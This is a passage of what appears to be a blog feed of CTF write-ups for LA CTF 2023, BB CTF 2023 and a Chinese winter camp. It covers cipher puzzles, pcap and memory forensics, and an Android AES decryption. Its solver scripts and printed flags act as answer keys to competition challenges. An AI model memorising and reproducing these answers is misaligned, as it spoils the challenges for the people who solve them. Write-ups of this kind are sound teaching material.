XOR.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span>*<br>pt = <span class="hljs-string">b&quot;Long ago, the four nations lived together in harmony ...&quot;</span><br>ct = <span class="hljs-number">0x200e0d13461a055b4e592b0054543902462d1000042b045f1c407f18581b56194c150c13030f0a5110593606111c3e1f5e305e174571431e</span><br>ct=long_to_bytes(<span class="hljs-built_in">int</span>(ct))<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(ct)):<br>    flag = (pt[i] ^ ct[i])<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(flag),end=<span class="hljs-string">&#x27;&#x27;</span>)<br><span class="hljs-comment">#lactf&#123;b4by_h1t_m3_0ne_m0r3_t1m3&#125;</span><br></code></pre></td></tr></table></figure><h4 id="2-chinese-lazy-theorem-1"><a href="#2-chinese-lazy-theorem-1" class="headerlink" title="2. chinese-lazy-theorem-1"></a>2. chinese-lazy-theorem-1</h4><p>Make the modulus greater than the maximum value of the target, which is p*q, to leak the target, and then get the flag according to the target.<br><img src="/mdimg/LACTF2023/1.png"></p><h4 id="3-rolling-in-the-mud"><a href="#3-rolling-in-the-mud" class="headerlink" title="3. rolling in the mud"></a>3. rolling in the mud</h4><p><img src="/mdimg/LACTF2023/2.png"><br>Solve the pigsty password.</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="hljs-template-variable">&#123;eombmcvcalebupauntcnjppmjfnicnappmjfnippmjfni&#125;</span><span class="language-xml">dugip</span><br></code></pre></td></tr></table></figure><p>After the reverse order, use quip to blast.</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">lactf</span><span class="hljs-template-variable">&#123;rolling_and_rolling_and_rolling_until_the_pigs_go_home&#125;</span><br></code></pre></td></tr></table></figure><h4 id="4-greek-cipher"><a href="#4-greek-cipher" class="headerlink" title="4. greek cipher"></a>4. greek cipher</h4><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs haxe">κςκ ωπν αζπλ ιησι χνοςνθ μσγθσρ λσθ ζπι ιηγ δςρθι ψγρθπζ ςζ ηςθιπρω θνθψγμιγκ πδ νθςζε γζμρωψιςπζ? τγ ζγςιηγρ. κςκ ωπν αζπλ ιησι χνοςνθ μσγθσρ λσθ ψρπξσξοω δονγζι ςζ εργγα? τγ ζγςιηγρ. ς οςαγ ηπλ εργγα μησρσμιγρ οππα ιηπνεη, γυγζ ςδ ς μσζ<span class="hljs-string">&#x27;ι ργσκ ιηγτ. οσμιδ&#123;ς_ενγθθ_νθςζε_τσζω_εργγα_μησρσμιγρθ_κςκζ&#x27;</span>ι<span class="hljs-literal">_</span>θιπψ<span class="hljs-literal">_</span>ωπν<span class="hljs-number">._</span>λγοο<span class="hljs-literal">_</span>ψοσωγκ<span class="hljs-literal">_</span>ς<span class="hljs-literal">_</span>τνθι<span class="hljs-literal">_</span>θσω.μπζερσιθ!&#125;<br>print(<span class="hljs-string">&#x27;&#x27;</span>.join(sorted(<span class="hljs-keyword">set</span>(input()))))<br></code></pre></td></tr></table></figure><p>This code implements the de-reordering function of a string. It takes user input as a string, converts it to a set, and removes duplicate characters. Then, it sorts the collection, and converts it back to a string. Finally, the code prints out the result using the “print” function.<br>and then with the help of a tool site<a href="https://tio.run/#">https://tio.run/#</a><br><img src="/mdimg/LACTF2023/3.png"><br>Then use Cyberchef’s Substitute.<br><img src="/mdimg/LACTF2023/4.png"><br>Finally, quipqiup can be blasted.</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">lactf&#123;i_guess_using_many_greek_characters_didn<span class="hljs-symbol">&#x27;t_stop_you._well_played_i_must_say.congrats</span>!&#125;<br></code></pre></td></tr></table></figure><h4 id="5-guess-the-bit"><a href="#5-guess-the-bit" class="headerlink" title="5. guess-the-bit!"></a>5. guess-the-bit!</h4><p>Carefully observe the encryption source code logic, 150 cycles are performed, and each cycle generates a random number c, which is either the square of the original number, or the product of the square of the original number and 6. So you need to guess whether the number is a square or a multiple of 6.</p><p><img src="/mdimg/LACTF2023/5.png"><br>As shown in the figure above, if both conditions are true, return “1” to the server, otherwise return “0”. Write a script with the help of pwntools.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> sympy.ntheory.primetest <span class="hljs-keyword">import</span> is_square <br><br>p = remote(<span class="hljs-string">&#x27;lac.tf&#x27;</span>, <span class="hljs-number">31190</span>)<br>p.recvline()<br>p.recvline()<br><br>C = <span class="hljs-number">0</span><br><br><span class="hljs-keyword">while</span> C != <span class="hljs-number">150</span>:<br>    c = <span class="hljs-built_in">int</span>((p.recvline().decode()).split(<span class="hljs-string">&quot; &quot;</span>)[-<span class="hljs-number">1</span>])<br>    <span class="hljs-keyword">if</span> c%<span class="hljs-number">6</span> == <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> is_square(c//<span class="hljs-number">6</span>):<br>        p.sendline(<span class="hljs-string">b&quot;1&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        p.sendline(<span class="hljs-string">b&quot;0&quot;</span>)<br>    C += <span class="hljs-number">1</span><br>    <span class="hljs-built_in">print</span>(C,end=<span class="hljs-string">&quot;\r&quot;</span>)<br><span class="hljs-built_in">print</span>(p.recv(<span class="hljs-number">1024</span>))<br><span class="hljs-built_in">print</span>(p.recv(<span class="hljs-number">1024</span>))<br><br><span class="hljs-comment"># lactf&#123;sm4ll_pla1nt3xt_sp4ac3s_ar3n&#x27;t_al4ways_e4sy&#125;</span><br></code></pre></td></tr></table></figure><h4 id="6-chinese-lazy-theorem-2"><a href="#6-chinese-lazy-theorem-2" class="headerlink" title="6. chinese-lazy-theorem-2"></a>6. chinese-lazy-theorem-2</h4><p>According to the chinese lazy theorem, if you find <code>target % p</code> and <code>target % q</code>, you can find <code>target % pq</code>, but knowing <code>target % pq</code> is not enough, because the maximum target is <code>p*q*2*3 *5</code>, so try 30 times <code>(target % pq) + i * pq</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> sympy.ntheory.modular <span class="hljs-keyword">import</span> crt<br><br><span class="hljs-keyword">with</span> remote(<span class="hljs-string">&quot;lac.tf&quot;</span>, <span class="hljs-number">31111</span>) <span class="hljs-keyword">as</span> r:<br>    p = <span class="hljs-built_in">int</span>(r.readline(<span class="hljs-literal">False</span>))<br>    q = <span class="hljs-built_in">int</span>(r.readline(<span class="hljs-literal">False</span>))<br>    r.sendline(<span class="hljs-string">b&quot;1&quot;</span>)<br>    r.readuntil(<span class="hljs-string">b&quot;Type your modulus here: &quot;</span>)<br>    r.sendline(<span class="hljs-built_in">str</span>(p).encode())<br>    x = <span class="hljs-built_in">int</span>(r.readline(<span class="hljs-literal">False</span>))<br>    r.sendline(<span class="hljs-string">b&quot;1&quot;</span>)<br>    r.readuntil(<span class="hljs-string">b&quot;Type your modulus here: &quot;</span>)<br>    r.sendline(<span class="hljs-built_in">str</span>(q).encode())<br>    y = <span class="hljs-built_in">int</span>(r.readline(<span class="hljs-literal">False</span>))<br>    a, b = crt([p,q],[x,y])<br>    r.sendline(<span class="hljs-string">b&quot;2&quot;</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">30</span>):<br>        r.readuntil(<span class="hljs-string">b&quot;Type your guess here: &quot;</span>)<br>        r.sendline(<span class="hljs-built_in">str</span>(a+i*b).encode())<br>        <span class="hljs-built_in">print</span>(r.readline())<br></code></pre></td></tr></table></figure><h3 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h3><h4 id="1-ECB"><a href="#1-ECB" class="headerlink" title="1. ECB"></a>1. ECB</h4><p>UDP traffic analysis, using RFC 3514，<a href="https://www.ietf.org/rfc/rfc3514.txt">https://www.ietf.org/rfc/rfc3514.txt</a><br><img src="/mdimg/LACTF2023/7.png"></p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs applescript">Flags <span class="hljs-keyword">is</span> <span class="hljs-keyword">the</span> abbreviation <span class="hljs-keyword">of</span> flag Segment, which <span class="hljs-keyword">is</span> a flag field.<br>It <span class="hljs-keyword">is</span> actually a field <span class="hljs-keyword">in</span> <span class="hljs-keyword">the</span> IP packet header. Because most <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> TCP, UDP, <span class="hljs-keyword">and</span> <span class="hljs-built_in">application</span> layer protocols are encapsulated <span class="hljs-keyword">in</span> IP packets, you will often see this field when analyzing these protocols.<br>The identification field has <span class="hljs-number">3</span> bits.<br>Reserved bit: <span class="hljs-number">1</span> bit, which <span class="hljs-keyword">is</span> a reserved bit <span class="hljs-keyword">and</span> generally <span class="hljs-keyword">not</span> used;<br>Don&#x27;t fragment: <span class="hljs-number">1</span> bit, used <span class="hljs-keyword">to</span> indicate whether <span class="hljs-keyword">the</span> data packet <span class="hljs-keyword">is</span> fragmented (Not <span class="hljs-keyword">set</span> means <span class="hljs-keyword">that</span> <span class="hljs-keyword">the</span> data packet <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> fragmented);<br>More fragment: <span class="hljs-number">1</span> bit, used <span class="hljs-keyword">to</span> indicate whether <span class="hljs-keyword">it</span> <span class="hljs-keyword">is</span> <span class="hljs-keyword">the</span> <span class="hljs-keyword">last</span> fragment (Not <span class="hljs-keyword">set</span> means <span class="hljs-keyword">it</span> <span class="hljs-keyword">is</span> <span class="hljs-keyword">the</span> <span class="hljs-keyword">last</span> one).<br></code></pre></td></tr></table></figure><p>Check the flags field and the Data segment. The data segment has 1 byte of data.<br><img src="/mdimg/LACTF2023/8.png"><br>Looking down, in N0.5, the setting of Reserved bit has changed.<br><img src="/mdimg/LACTF2023/9.png"><br>Check RFC 3514 official document, if <code>Reserved bit</code> is set to <code>1 (0x1)</code>, it is a malicious packet.<br><img src="/mdimg/LACTF2023/10.png"><br>So we only need to filter out the packets whose <code>Reserved bit</code> is 0, set the data and Reserved bit as columns, and set the Reserved bit as 0 as the filter condition, that is, <code>ip.flags.rb == 0</code>, observe The first few discoveries are the hex values of lactf.<br><img src="/mdimg/LACTF2023/11.png"><br>Export the filtered UDP flow, open the saved UDP flow packet and track the UDP flow directly.<br><img src="/mdimg/LACTF2023/12.png"><br>You can also use tshark.</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs haskell"><span class="hljs-title">tshark</span> -r <span class="hljs-type">EBE</span>.pcap -<span class="hljs-type">Y</span> <span class="hljs-string">&quot;ip.flags.rb == 0x0&quot;</span> -<span class="hljs-type">T</span> fields -e <span class="hljs-class"><span class="hljs-keyword">data</span> | xxd -r -p</span><br></code></pre></td></tr></table></figure><p><img src="/mdimg/LACTF2023/13.png"></p><h4 id="2-CATS"><a href="#2-CATS" class="headerlink" title="2.CATS!"></a>2.CATS!</h4><p><img src="/mdimg/LACTF2023/14.png"><br><img src="/mdimg/LACTF2023/15.png"><br><a href="https://www.mentalfloss.com/article/576608/lanai-cat-sanctuary-hawaii-shelters-600-cats">https://www.mentalfloss.com/article/576608/lanai-cat-sanctuary-hawaii-shelters-600-cats</a>There is their official website in the article, as shown in the figure below<br><img src="/mdimg/LACTF2023/16.png"></p><h4 id="3-hidden-in-plain-sheets"><a href="#3-hidden-in-plain-sheets" class="headerlink" title="3. hidden in plain sheets"></a>3. hidden in plain sheets</h4><p>The flag is in another Sheet but we don’t have permission to view it.</p><p><img src="/mdimg/LACTF2023/17.png"><br>After checking the data, I found that the <code>IMPORTRANGE</code> function of Google Sheets can import the content.<br><img src="/mdimg/LACTF2023/18.png"><br>So use IMPORTRANGE to get the flag directly<br><img src="/mdimg/LACTF2023/19.png"></p><h4 id="4-discord-l34k"><a href="#4-discord-l34k" class="headerlink" title="4. discord l34k"></a>4. discord l34k</h4><p>The topic gave a discord link</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">https</span>://discord.com/channels/<span class="hljs-number">1060030874722259057</span>/<span class="hljs-number">1060030875187822724</span>/<span class="hljs-number">1060031064669700186</span><br></code></pre></td></tr></table></figure><p><a href="https://discord.com/blog/add-the-discord-widget-to-your-site/">https://discord.com/blog/add-the-discord-widget-to-your-site/</a>  Find key images in this post.<br><img src="/mdimg/LACTF2023/20.png"></p><p>Below the image see the URL for the JSON API. In the given URL, the first ID ( 1060030874722259057 ) refers to the server, so we put that in the image where the example ID is. This gives us the link.</p><p><a href="https://discordapp.com/api/servers/1060030874722259057/widget.json">https://discordapp.com/api/servers/1060030874722259057/widget.json</a><br><img src="/mdimg/LACTF2023/21.png"><br>After opening it, I found that it is an invitation link. After opening it, enter the LA CTF-Chall Server 5 server, and you can see the flag.<br><img src="/mdimg/LACTF2023/22.png"><br><img src="/mdimg/LACTF2023/23.png"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Write Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Write Up</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BB CTF 2023</title>
    <link href="/2023/02/07/BBCTF/"/>
    <url>/2023/02/07/BBCTF/</url>
    
    <content type="html"><![CDATA[<h2 id="1-Memory-Dump"><a href="#1-Memory-Dump" class="headerlink" title="1. Memory Dump"></a>1. Memory Dump</h2><h3 id="题目说明"><a href="#题目说明" class="headerlink" title="题目说明"></a>题目说明</h3><p>I was learning powershell when my pc suddenly crashed. Can you retrieve my bash history?</p><h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><h4 id="法一"><a href="#法一" class="headerlink" title="法一"></a>法一</h4><p>之前长安杯做过PowerShell的取证题，PowerShell历史命令文件路径为<br><code>%USERPROFILE%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</code><br>所以我们直接去filescan<code>ConsoleHost_history.txt</code><br><img src="/mdimg/2023BBCTF/1.png"><br>虽然报错了 但还是找出来了捏 dump一下<br><img src="/mdimg/2023BBCTF/2.png"><br>cat 一下下<br><img src="/mdimg/2023BBCTF/3.png"><br>AES解密即可<br><img src="/mdimg/2023BBCTF/4.png"></p><h4 id="法二"><a href="#法二" class="headerlink" title="法二"></a>法二</h4><p>因为<code>ConsoleHost_history.txt</code>为文本形式，所以利用strings转换一下直接搜索<code>flag&#123;</code>即可<br><img src="/mdimg/2023BBCTF/5.png"></p><h2 id="2-Vastness-of-Space"><a href="#2-Vastness-of-Space" class="headerlink" title="2. Vastness of Space"></a>2. Vastness of Space</h2><h3 id="题目说明-1"><a href="#题目说明-1" class="headerlink" title="题目说明"></a>题目说明</h3><p>Is space really that empty?</p><h3 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h3><p>查看图片exif信息<br><img src="/mdimg/2023BBCTF/6.png"><br>steghide隐写 password：BBCTF<br><img src="/mdimg/2023BBCTF/7.png"><br>用matplotlib库还原一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><span class="hljs-keyword">import</span> matplotlib.pyplot <span class="hljs-keyword">as</span> plt<br><br>data = np.genfromtxt(<span class="hljs-string">&quot;somedata.txt&quot;</span>, delimiter=<span class="hljs-string">&quot;,&quot;</span>)<br><br>num = data[:,<span class="hljs-number">0</span>]<br>data = data[:,<span class="hljs-number">1</span>]<br><br>plt.plot(num,data, <span class="hljs-string">&#x27;ro&#x27;</span>)<br><br>plt.xlabel(<span class="hljs-string">&#x27;x&#x27;</span>)<br>plt.ylabel(<span class="hljs-string">&#x27;y&#x27;</span>)<br>plt.show()<br></code></pre></td></tr></table></figure><p><img src="/mdimg/2023BBCTF/8.png"><br>扫码即可get flag</p><h2 id="3-Random-Requests"><a href="#3-Random-Requests" class="headerlink" title="3. Random Requests"></a>3. Random Requests</h2><h3 id="题目说明-2"><a href="#题目说明-2" class="headerlink" title="题目说明"></a>题目说明</h3><p>I captured these very random http requests. Can you help me decode them?</p><h3 id="解题思路-2"><a href="#解题思路-2" class="headerlink" title="解题思路"></a>解题思路</h3><p>过滤HTTP流量可以看到有很多GET请求 flag=0/flag=1，所以猜测flag就是由二进制数据组成<br><img src="/mdimg/2023BBCTF/9.png"><br>写脚本&amp;手撸&amp;用tshark提取一下都可以，这里用tshark提取二进制数据<br><code>tshark -r random_requests.pcapng -Y &quot;http.request.method == &quot;GET&quot;&quot; | cut -d &#39;/&#39; -f2 | cut -d &#39; &#39; -f1 | cut -d &#39;=&#39; -f2 | tr -d &#39;\n&#39;</code><br><img src="/mdimg/2023BBCTF/10.png"><br>然后cyberchef一把梭<br><img src="/mdimg/2023BBCTF/11.png"></p><h2 id="4-Imageception"><a href="#4-Imageception" class="headerlink" title="4. Imageception"></a>4. Imageception</h2><h3 id="题目说明-3"><a href="#题目说明-3" class="headerlink" title="题目说明"></a>题目说明</h3><p>“The painter has the universe in his mind and hands.”<br>-Leonardo Da Vinci</p><h3 id="解题思路-3"><a href="#解题思路-3" class="headerlink" title="解题思路"></a>解题思路</h3><p>题目名称为imageception，所以直接FileScan搜索<br><code>python vol.py -f ./BBCTF/Imageception.raw windows.filescan.FileScan | grep &quot;imageception&quot;</code><br><img src="/mdimg/2023BBCTF/12.png"><br>发现有个<code>imageception.png</code> 把他dump下来<br><img src="/mdimg/2023BBCTF/13.png"><br>这里显示Error dumping file 但是文件夹里已经dump出来了。<br><img src="/mdimg/2023BBCTF/14.png"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Write Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Write Up</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>第二届山石网科冬令营</title>
    <link href="/2023/02/06/2023%E5%B1%B1%E7%9F%B3%E5%86%AC%E4%BB%A4%E8%90%A5/"/>
    <url>/2023/02/06/2023%E5%B1%B1%E7%9F%B3%E5%86%AC%E4%BB%A4%E8%90%A5/</url>
    
    <content type="html"><![CDATA[<h1 id="Mobile"><a href="#Mobile" class="headerlink" title="Mobile"></a>Mobile</h1><h2 id="HSAndroid1"><a href="#HSAndroid1" class="headerlink" title="HSAndroid1"></a>HSAndroid1</h2><p><img src="/mdimg/2023sswk/1.png"><br>网上找了个脚本，AES解密即可</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Crypto;<br><span class="hljs-keyword">import</span> java.security.InvalidAlgorithmParameterException;<br><span class="hljs-keyword">import</span> java.security.InvalidKeyException;<br><span class="hljs-keyword">import</span> java.security.NoSuchAlgorithmException;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">import</span> javax.crypto.BadPaddingException;<br><span class="hljs-keyword">import</span> javax.crypto.Cipher;<br><span class="hljs-keyword">import</span> javax.crypto.IllegalBlockSizeException;<br><span class="hljs-keyword">import</span> javax.crypto.NoSuchPaddingException;<br><span class="hljs-keyword">import</span> javax.crypto.SecretKey;<br><span class="hljs-keyword">import</span> javax.crypto.spec.IvParameterSpec;<br><span class="hljs-keyword">import</span> javax.crypto.spec.SecretKeySpec;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Crypto</span> &#123;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">decrypt</span><span class="hljs-params">(String str2, String str22, SecretKey secretKey, IvParameterSpec ivParameterSpec)</span> <span class="hljs-keyword">throws</span> IllegalBlockSizeException, BadPaddingException, InvalidKeyException, InvalidAlgorithmParameterException, NoSuchAlgorithmException, NoSuchPaddingException &#123;<br>        <span class="hljs-type">Cipher</span> <span class="hljs-variable">instance</span> <span class="hljs-operator">=</span> Cipher.getInstance(str2);<br>        instance.init(<span class="hljs-number">2</span>, secretKey, ivParameterSpec);<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(instance.doFinal(Base64.getDecoder().decode(str22)));<br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> InvalidKeyException, IllegalBlockSizeException, BadPaddingException, InvalidAlgorithmParameterException, NoSuchAlgorithmException, NoSuchPaddingException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">decryptedString</span> <span class="hljs-operator">=</span> decrypt(<span class="hljs-string">&quot;AES/CBC/PKCS5Padding&quot;</span>, <span class="hljs-string">&quot;HyKsaPpqT4l436tHiSEXtIlLgVV4GE7mGc2WoI0KlP2YhKFco7OPcJYtS58BFwDq&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">SecretKeySpec</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[]&#123;<span class="hljs-number">12</span>, <span class="hljs-number">32</span>, <span class="hljs-number">13</span>, <span class="hljs-number">14</span>, <span class="hljs-number">23</span>, <span class="hljs-number">108</span>, <span class="hljs-number">31</span>, <span class="hljs-number">108</span>, <span class="hljs-number">44</span>, <span class="hljs-number">121</span>, <span class="hljs-number">42</span>, <span class="hljs-number">121</span>, <span class="hljs-number">42</span>, <span class="hljs-number">113</span>, <span class="hljs-number">41</span>, <span class="hljs-number">124</span>&#125;, <span class="hljs-number">0</span>, <span class="hljs-number">16</span>, <span class="hljs-string">&quot;AES&quot;</span>), <span class="hljs-keyword">new</span> <span class="hljs-title class_">IvParameterSpec</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[]&#123;<span class="hljs-number">12</span>, <span class="hljs-number">32</span>, <span class="hljs-number">13</span>, <span class="hljs-number">14</span>, <span class="hljs-number">23</span>, <span class="hljs-number">108</span>, <span class="hljs-number">31</span>, <span class="hljs-number">108</span>, <span class="hljs-number">44</span>, <span class="hljs-number">121</span>, <span class="hljs-number">42</span>, <span class="hljs-number">121</span>, <span class="hljs-number">42</span>, <span class="hljs-number">113</span>, <span class="hljs-number">41</span>, <span class="hljs-number">124</span>&#125;));<br>        System.out.println(<span class="hljs-string">&quot;After decryption - &quot;</span> + decryptedString);<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">//hsnctf&#123;android_is_not_e4sy_will_caref1ul&#125;</span><br></code></pre></td></tr></table></figure><h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h2 id="daobudao"><a href="#daobudao" class="headerlink" title="daobudao"></a>daobudao</h2><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">a3ZxZndpe2owMGdfb3hmbl9rZHloX2l4cX0=</span><br><span class="language-xml"></span><br><span class="language-xml">base64:</span><br><span class="language-xml">kvqfwi</span><span class="hljs-template-variable">&#123;j00g_oxfn_kdyh_ixq&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">caeser 3:</span><br><span class="language-xml">hsnctf</span><span class="hljs-template-variable">&#123;g00d_luck_have_fun&#125;</span><br></code></pre></td></tr></table></figure><h2 id="strange-chacha"><a href="#strange-chacha" class="headerlink" title="strange_chacha"></a>strange_chacha</h2><p>CryptoCTF Aniely原题 参考春哥的wp：<a href="https://zhuanlan.zhihu.com/p/545950898">https://zhuanlan.zhihu.com/p/545950898</a></p><p> chacha流密码，产生一段密钥流用于加密，类似伪随机数发生器，产生密钥流 。爆破一个短随机数即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> os <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> itertools<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">AS</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, passphrase</span>):<br>        self.passphrase = passphrase<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">go</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">mixer</span>(<span class="hljs-params">u, v</span>):<br>            <span class="hljs-keyword">return</span> ((u &lt;&lt; v) &amp; <span class="hljs-number">0xffffffff</span>) | u &gt;&gt; (<span class="hljs-number">32</span> - v)<br><br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">forge</span>(<span class="hljs-params">w, a, b, c, d</span>):<br>            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>):<br>                w[a] = (w[a] + w[b]) &amp; <span class="hljs-number">0xffffffff</span><br>                w[d] = mixer(w[a] ^ w[d], <span class="hljs-number">16</span> // (i + <span class="hljs-number">1</span>))<br>                w[c] = (w[c] + w[d]) &amp; <span class="hljs-number">0xffffffff</span><br>                w[b] = mixer(w[b] ^ w[c], (<span class="hljs-number">12</span> + <span class="hljs-number">2</span>*i) // (i + <span class="hljs-number">1</span>))<br><br>        bring = [<span class="hljs-number">0</span>] * <span class="hljs-number">16</span><br>        bring[:<span class="hljs-number">4</span>] = [<span class="hljs-number">0x61707865</span>, <span class="hljs-number">0x3320646e</span>, <span 